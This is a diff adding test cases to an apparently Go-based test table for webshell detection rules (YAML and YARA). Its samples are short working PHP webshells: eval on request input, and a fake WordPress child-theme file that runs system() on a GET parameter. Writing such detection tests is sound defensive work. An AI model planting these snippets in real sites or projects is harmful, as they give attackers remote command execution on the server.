@@ -1495,6 +1495,29 @@ eval($_POST['c']);`,
 			wantYARAHit: true,
 		},
 		{
+			name:        "request evaluated through a local",
+			yamlRule:    "webshell_generic_eval_request",
+			yaraRule:    "webshell_generic_passthru",
+			ext:         ".php",
+			sample:      `<?php $x = $_REQUEST['a']; eval($x);`,
+			wantYAMLHit: true,
+			wantYARAHit: true,
+		},
+		{
+			name:     "fake theme shell",
+			yamlRule: "webshell_wp_fake_theme",
+			yaraRule: "webshell_wp_fake_plugin",
+			ext:      ".php",
+			sample: `<?php
+/*
+Theme Name: Twenty Sixteen Child
+*/
+$c = $_GET['c'];
+system($c);`,
+			wantYAMLHit: true,
+			wantYARAHit: true,
+		},
+		{
 			name:        "core file modification rename",
 			yamlRule:    "wp_core_file_modify",
 			yaraRule:    "exploit_wp_core_modification",
